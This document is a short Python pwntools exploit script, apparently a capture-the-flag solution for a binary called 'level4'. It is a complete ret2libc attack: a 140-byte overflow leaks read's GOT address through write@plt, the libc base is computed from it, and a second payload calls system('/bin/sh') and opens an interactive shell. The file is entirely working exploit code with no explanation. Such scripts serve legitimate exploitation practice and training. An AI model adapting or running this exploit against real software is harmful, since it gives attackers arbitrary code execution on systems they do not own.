#!/usr/bin/env python
from pwn import*

junc = 'A'*140
elf = ELF('./level4')
write_plt = elf.symbols['write']
read_got = elf.got['read']
main_plt = elf.symbols['main']

libc = ELF('./libc.so')
read_libc = libc.symbols['read']
system_libc = libc.symbols['system']
binsh_libc = next(libc.search('/bin/sh'))

p = process('./level4')

#leak read_got_addr
payload = junc + p32(write_plt) + p32(main_plt) + p32(1) + p32(read_got) + p32(4)
p.recvuntil('Hello, World\n')
p.send(payload)

read_addr = u32(p.recv(4))

#calc system_addr
libc_off = read_addr - read_libc
system_addr = system_libc + libc_off
binsh_addr = binsh_libc + libc_off

#get_shell
payload = junc + p32(system_addr) + p32(main_plt) + p32(binsh_addr)
p.recvuntil('Hello, World\n')
p.send(payload)

p.interactive()




